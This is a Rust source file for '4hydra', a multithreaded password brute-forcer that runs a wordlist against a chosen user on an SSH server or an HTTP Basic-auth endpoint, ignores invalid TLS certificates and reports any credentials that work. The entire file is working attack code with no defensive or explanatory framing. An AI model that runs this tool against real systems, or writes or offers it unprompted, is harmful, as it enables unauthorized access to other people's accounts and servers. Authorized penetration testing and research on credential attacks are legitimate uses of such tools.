
use anyhow::Result;
use reqwest::Client;
use tokio::sync::mpsc;
use std::time::Duration;
use std::sync::Arc;
use std::net::TcpStream;
use ssh2::Session;

pub async fn run_4hydra(
    target: String, 
    user: String, 
    passlist_path: String, 
    threads: usize, 
    timeout_ms: u64, 
    tx: mpsc::UnboundedSender<String>
) -> Result<()> {
    let wordlist = match std::fs::read_to_string(&passlist_path) {
        Ok(s) => s,
        Err(e) => {
            let _ = tx.send(format!("Error reading wordlist: {}", e));
            anyhow::bail!("Wordlist fail");
        }
    };

    let passwords: Vec<String> = wordlist.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
    let client = Client::builder()
        .timeout(Duration::from_millis(timeout_ms))
        .danger_accept_invalid_certs(true)
        .build()?;

    let is_ssh = target.ends_with(":22") || !target.contains("://") && !target.contains(':');
    let mode = if is_ssh { "SSH" } else { "HTTP-Basic" };

    let _ = tx.send(format!("🚀 4hydra Architect starting on {} mode:{} (User: {}, {} passwords)", target, mode, user, passwords.len()));
    
    let pass_arc = Arc::new(passwords);
    let chunk_size = (pass_arc.len() + threads - 1) / threads;
    let mut handles = Vec::new();
    let target_arc = Arc::new(target);

    for i in 0..threads {
        let pass_chunk = Arc::clone(&pass_arc);
        let tx_inner = tx.clone();
        let client_inner = client.clone();
        let target_inner = Arc::clone(&target_arc);
        let user_inner = user.clone();

        let handle = tokio::spawn(async move {
            let start = i * chunk_size;
            let end = (start + chunk_size).min(pass_chunk.len());
            for idx in start..end {
                let pass = &pass_chunk[idx];
                
                if is_ssh {

                    let target_raw = if target_inner.contains(':') { target_inner.to_string() } else { format!("{}:22", target_inner) };
                    if let Ok(stream) = TcpStream::connect_timeout(&target_raw.parse().unwrap_or("127.0.0.1:22".parse().unwrap()), Duration::from_millis(1500)) {
                        let mut sess = Session::new().unwrap();
                        sess.set_tcp_stream(stream);
                        sess.handshake().unwrap();
                        if sess.userauth_password(&user_inner, pass).is_ok() {
                            let _ = tx_inner.send(format!("[SUCCESS] Valid SSH credentials: {}:{}", user_inner, pass));
                            break;
                        }
                    }
                } else {

                    match client_inner.get(target_inner.as_str())
                        .basic_auth(&user_inner, Some(pass))
                        .send()
                        .await {
                            Ok(resp) => {
                                if resp.status().is_success() {
                                    let _ = tx_inner.send(format!("[SUCCESS] Valid HTTP credentials: {}:{}", user_inner, pass));
                                    break;
                                }
                            }
                            Err(_) => {}
                        }
                }
            }
        });
        handles.push(handle);
    }

    for (i, h) in handles.into_iter().enumerate() {
        let _ = h.await;
        let p = ((i + 1) as f32 / threads as f32 * 100.0) as u32;
        let _ = tx.send(format!("[PROGRESS] {}%", p));
    }

    let _ = tx.send("[PROGRESS] 100%".into());
    let _ = tx.send("🏆 4hydra brute-force complete.".into());
    Ok(())
}
